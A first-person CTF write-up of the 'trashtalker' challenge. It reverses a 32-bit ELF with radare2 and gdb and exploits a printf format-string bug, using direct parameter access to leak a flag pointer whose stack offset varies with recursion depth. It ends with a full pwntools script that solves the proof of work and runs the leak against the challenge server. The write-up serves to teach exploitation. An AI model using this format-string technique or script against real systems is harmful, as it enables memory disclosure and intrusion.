# Trashtalker

## Foreward
Justin did such a good writeup of my MBR thing that I had to repay the favour
by doing a writeup for his. I particularly liked this one!

## Challenge
I wasn't actually in any of the CTFs, I saw @snare post something about doing a
this on Twitter and thought I'd have a crack at it too. I went to
http://trashtalker.ring0.lol and pulled down the binary, and then _stopped
reading_. In hindsight, if I had have read the rest of it I would have saved
a bit of time instead of figuring out how the proof of work part worked but
¯\\\_(ツ)\_/¯.

> The proof-of-work challenges look like 'n:s'. You should respond with a
> string that, when appended to s, results in a string that has a SHA256 that
> starts with n "0" characters (when represented in hex). Hashes are calculated
> without trailing newlines, and you should only send a winning suffix (not the
> whole string)

As a side note, here is my first interaction with the program before I had
read anything:

```
lxb$ ./trashtalker
Usage: ./trashtalker <pow-difficulty>
  pow-difficulty of 0 virtually disables the POW challenge
  pow-difficulty must be >=0 and <=64
lxb$ ./trashtalker 0
0:44F183C6E591ABE1
0:44F183C6E591ABE1
OK
Loading game
................................................................................
Bet you don't know the flag.
Nah
Nah?
Nah that's not it.
```

\#straya

## Reversing
First thing I did was look for strings, because sure why not:

```
[0x00008af0]> iz~flag
vaddr=0x0001c628 paddr=0x0001c628 ordinal=000 sz=90 len=89 section=.rodata type=ascii string=not_the_flag{the flag you seek is on the server. If you DM this to me I'll laugh at you.}
vaddr=0x0001c79d paddr=0x0001c79d ordinal=011 sz=29 len=28 section=.rodata type=ascii string=Bet you don't know the flag.
```

Cool, I found the flag without having to do anything! Unsure why there were
people struggling with this one...Anyway, for the sake of it I kept going to
see what else I could find.

```
[0x00008af0]> iI
havecode true
pic      true
canary   true
nx       true
crypto   false
va       true
intrp    /lib/ld-linux.so.2
bintype  elf
class    ELF32
lang     c
arch     x86
bits     32
machine  Intel 80386
os       linux
minopsz  1
maxopsz  16
pcalign  0
subsys   linux
endian   little
stripped false
static   false
linenum  true
lsyms    true
relocs   true
rpath    NONE
binsz    233513
```

It's an unstripped ELF32. Nothing weird here.

What I did here was reverse it starting from main. I had a quick look through
the functions since it wasn't stripped and realised it was quite a small
program so it didn't seem like the worst approach.

### main
* `0x8af0`: Get the pow-difficulty argument, call `atoi()` and make sure it
            is less than 64, print usage if you dick up
* `0x8b68`: `srandom(time() ^ getpid()); proofofwork(proof_of_work);` die if not 0
* `0x8bb9`: `introduceGame()`, return a string and compares it with the flag,
            either print "Yeah that's it." and die or print "Nah that's not
            it." and die

Okay...

### proofofwork
* `0x8c53`: Generate a random 0x10 long hexstring
* `0x8c8c`: `printf("%d:%s\n", proof_of_work, hexstring)`, get input, strip the
            newline and append to the hexstring
* `0x8cd9`: Compute the SHA-256 message digest of the concatenation
* `0x8d04`: Compute the hexdigest
* `0x8d3f`: Ensure the first n bytes of the hexdigest are '0', `puts("OK")` and
            return 0 or `puts("NO")` and return -1

Sure, I'll deal with that later...

### introduceGame
```c
times = rand(); /* More or less, there's some math stuff I cbf working out */
puts("Loading game");
return printDots(times);
```

Yep.

### printDots
```c
printf(".");
sleep(rand()); /* More or less, again */
if (arg == 0) {
        puts("");
        return playGame();
} else {
        printDots(arg - 1);
}
```

Didn't really understand what the point of this was, assumed it was just to
slow attempts down or something. Turns out this was the clever part!

### playGame
* `0x8e52`: `puts("Bet you don't know the flag.")`, get 0x40 bytes of input, strip the newline
* `0x8e96`: Die if input contains `"%n"` or `"$n"`
* `0x8ed4`: `printf(input)`

Oh. I stopped here when I realised what the point of this was (I don't think
there was much left anyway, seems like it was just the logic for working out if
you got the flag right).

## Format String
I control the format string and the flag is still on the stack from `main()`
back in `0x8af7`. All I need to do is find that pointer and get `printf()` to
print it for me.

I can't really do this part statically, so I fired up a debugger and set a
breakpoint just before `printf()` gets called

```
lxb$ gdb ./trashtalker
(gdb) start 1
Temporary breakpoint 1 at 0x8af4
Starting program: /vagrant/trashtalker 1

Temporary breakpoint 1, 0x80008af4 in main ()
(gdb) disass playGame
Dump of assembler code for function playGame:

... snip ...

   0x80008ed4 <+130>:   lea    eax,[ebp-0x44]
   0x80008ed7 <+133>:   push   eax
   0x80008ed8 <+134>:   call   0xb7e5d150 <__printf>
   0x80008edd <+139>:   add    esp,0x4
   0x80008ee0 <+142>:   push   0x8001c7de

... snip ...

End of assembler dump.
(gdb) b *0x80008ed8
Breakpoint 2 at 0x80008ed8
(gdb) c
Continuing.

... snip ...

Breakpoint 2, 0x80008ed8 in playGame ()
(gdb) x/64wx $esp
0xbffff0c0:     0xbffff0c4      0x0068616e      0xb7e77700      0xb7fcae80
0xbffff0d0:     0x0000000a      0xb7ec6410      0xb7ef5ce5      0xbffff0f4
0xbffff0e0:     0x00000000      0xb7e5d178      0xb7e12940      0x5152d2c2
0xbffff0f0:     0xbffff10c      0xb7e7764b      0x5724b2e7      0x00000000
0xbffff100:     0x80008980      0xbffff0c7      0xbffff114      0x80008e50
0xbffff110:     0x8001c798      0xbffff124      0x80008e3c      0x00000000
0xbffff120:     0x8001c798      0xbffff134      0x80008e3c      0x00000001
0xbffff130:     0x8001c798      0xbffff144      0x80008e3c      0x00000002
0xbffff140:     0x8001c798      0xbffff154      0x80008e3c      0x00000003
0xbffff150:     0x8001c798      0xbffff164      0x80008e3c      0x00000004
0xbffff160:     0x8001c798      0xbffff174      0x80008e3c      0x00000005
0xbffff170:     0x8001c798      0xbffff184      0x80008e3c      0x00000006
0xbffff180:     0x8001c798      0xbffff194      0x80008e3c      0x00000007
0xbffff190:     0x8001c798      0xbffff1a4      0x80008e3c      0x00000008
0xbffff1a0:     0x8001c798      0xbffff1b4      0x80008e3c      0x00000009
0xbffff1b0:     0x8001c798      0xbffff1c4      0x80008e3c      0x0000000a
```

I searched the stack for a pointer to the flag:

```
(gdb) disass main
Dump of assembler code for function main:
   0x80008af0 <+0>:     push   ebp
   0x80008af1 <+1>:     mov    ebp,esp
   0x80008af3 <+3>:     push   ebx
   0x80008af4 <+4>:     sub    esp,0x8
   0x80008af7 <+7>:     mov    DWORD PTR [ebp-0x8],0x8001c628
(gdb) x/s 0x8001c628
0x8001c628:     "not_the_flag{the flag you seek is on the server. If you DM this to me I'll laugh at you.}"
(gdb) find $esp, $esp+0x900, 0x8001c628
0xbffff670
1 pattern found.
```

Cool, so I have an address/offset to the flag. But there's one catch, and
here's when I realised what the point of all the stuff leading up to
`playGame()` was: `printDots()` gets called a random number of times each
execution. This is what the stack looks like at the time printf() is called:

```
0xbffff0d4    <-- Format string
0xb7000061    <-- Current stack frame stuff
0xb7e77715    <-- Current stack frame stuff
0xb7fcae80    <-- Current stack frame stuff
0x0000000a    <-- Current stack frame stuff
0xb7ec6410    <-- Current stack frame stuff
0xb7ef5ce5    <-- Current stack frame stuff
0xbffff104    <-- Current stack frame stuff
0x00000000    <-- Current stack frame stuff
0xb7e5d178    <-- Current stack frame stuff
0xb7e12940    <-- Current stack frame stuff
0x7d22c3af    <-- Current stack frame stuff
0xbffff11c    <-- Current stack frame stuff
0xb7e7764b    <-- Current stack frame stuff
0x5724aa84    <-- Current stack frame stuff
0x00000000    <-- Current stack frame stuff
0x80008980    <-- Current stack frame stuff
0xbffff664    <-- printDots() Saved Base Pointer
0xbffff664    <-- printDots() Saved Base Pointer
0x80008dd4    <-- printDots() Saved Return Pointer
0x8001c798    <-- Local var "."

0xbffff664    <-- printDots() Saved Base Pointer
0x80008dd4    <-- printDots() Saved Return Pointer
0x00000000    <-- printDots() argument
0x8001c798    <-- Local var "."

...

0xbffff664    <-- printDots() Saved Base Pointer
0x80008dd4    <-- printDots() Saved Return Pointer
0x00000053    <-- printDots() argument
0x8001c798    <-- Local var "."

0xbffff664    <-- printDots() Saved Base Pointer
0x80008dd4    <-- printDots() Saved Return Pointer
0x00000053    <-- printDots() argument
0x8001c798    <-- Local var "."

0xbffff664    <-- introduceGame() Saved Base Pointer
0x80008dd4    <-- introduceGame() Saved Return Pointer
0x00000054    <-- printDots() argument

0x00000054    <-- introduceGame() argument

0xbffff678    <-- main() Saved Base Pointer
0x80008bbe    <-- main() Saved Return Pointer

0xb7fca000    <-- GOT
0x8001c628    <-- pointer to flag
```

Note that the addresses are probably all junk, I think I cobbled that together
from multiple executions. It's more the offset I care about

To work out the offset I can count the dots that get printed each time it gets
called:

```python
addr   = ESP + 0x60 + (len(dots) * word_size * things)
offset = ESP - addr
```

Since it would be unwieldy to try to construct a payload that uses heaps of
`%x`s or something, I used direct parameter access to specify the flag as the
`n`th argument of printf (this is as if you are calling `printf(input, stack,
stack, ..., stack, flag)`):

```python
position = offset / word_size
```

The final format string:

```python
fmt = '%{}$s'.format(position)
```

## Solution
Sick, so I have all the pieces, I just need to put everything together. I ended
up with the following code:

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""Solve the "trashtalker" CTF challenge."""
from __future__ import print_function
from hashlib import sha256
from itertools import product
from pwn import *
import sys


def bruteforce():
    """Create a stream of incrementing bytes."""
    values = [chr(b) for b in xrange(0x1, 0xff)]
    values.remove('\n')
    l = [values]
    while True:
        for bs in product(*l):
            yield ''.join(bs)
        l.append(values)


def solve_challenge(challenge):
    """Solve the proof of work challenge."""
    (n, s) = challenge.split(':')
    n = int(n)
    for suffix in bruteforce():
        if all(c in '0' for c in sha256(s + suffix).hexdigest()[:n]):
            return suffix


def format_string(dots):
    """Calculate direct parameter access value, return the format string."""
    junk = 0x60                      # 0x60 bytes of stuff already on the stack
    printdots = len(dots) * 4 * 4    # 4 words per stack frame
    return '%{}$s'.format((junk + printdots) / 4)


def proof_of_work(r):
    """Get the challenge and send the response."""
    challenge = r.recvline().strip()
    response = solve_challenge(challenge)
    r.send(response + '\n')
    r.recvline()
    # XXX: Not checking for errors


def format_string_exploit(r):
    """Get the dots and send the format string exploit."""
    r.recvline()    # Loading game
    dots = r.recvline().strip()
    r.recvline()    # Bet you don't know the flag
    fmt = format_string(dots)
    r.send(fmt + '\n')
    return r.recvline().strip()[:-1]


def send_flag(r, flag):
    """Get the dots and send the format string exploit."""
    r.recvline()    # Loading game
    r.recvline()    # Dots
    r.recvline()    # Bet you don't know the flag
    r.send(flag + '\n')
    r.recvline()    # flag?
    return r.recvline().strip()


def main():
    # Connect to host
    try:
        if len(sys.argv) != 3:
            raise ValueError    # ¯\_(ツ)_/¯
        hostname, port = sys.argv[1], int(sys.argv[2])
        r = remote(hostname, port)
    except (pwnlib.exception.PwnlibException, ValueError):
        print('lol no', file=sys.stderr)
        sys.exit(1)

    # Get flag
    proof_of_work(r)
    flag = format_string_exploit(r)
    print(flag)
    r.close()

    # Test that it's the correct flag
    # NOTE: Fails against the test binary because len(not_the_flag) > 0x40 and
    #       the message that gets sent is truncated
    r = remote(hostname, port)
    proof_of_work(r)
    print(send_flag(r, flag))
    r.close()


if __name__ == '__main__':
    main()
```

Tried it against the server:
```
lxb$ python poc.py trashtalker.ring0.lol 31337
[+] Opening connection to trashtalker.ring0.lol on port 31337: Done
... snip ...
[*] Closed connection to trashtalker.ring0.lol port 31337
[+] Opening connection to trashtalker.ring0.lol on port 31337: Done
Yeah that's it.
[*] Closed connection to trashtalker.ring0.lol port 31337
```
